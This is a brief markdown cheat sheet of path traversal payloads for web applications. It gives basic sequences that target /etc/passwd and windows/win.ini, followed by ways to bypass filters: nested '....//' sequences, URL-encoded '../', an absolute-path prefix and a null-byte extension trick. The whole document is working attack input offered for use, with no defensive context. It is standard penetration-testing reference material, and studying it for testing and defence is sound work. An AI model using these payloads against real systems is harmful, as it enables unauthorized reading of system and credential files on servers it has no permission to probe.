# Path Traversal Cheat Sheet
___
#### Common Method
```txt
../../../etc/passwd >> For linux

..\..\..\windows\win.ini >> For windows
```
#### Bypassing Defence Mechanism
```txt
Sequence block bypass >> ....//....//....//....//etc/passwd
Encoding ../ >> %2e%2e%2f
Absolute path >> /var/www/images/../../../etc/passwd
Using null byte >> ../../../etc/passwd%00.png
```
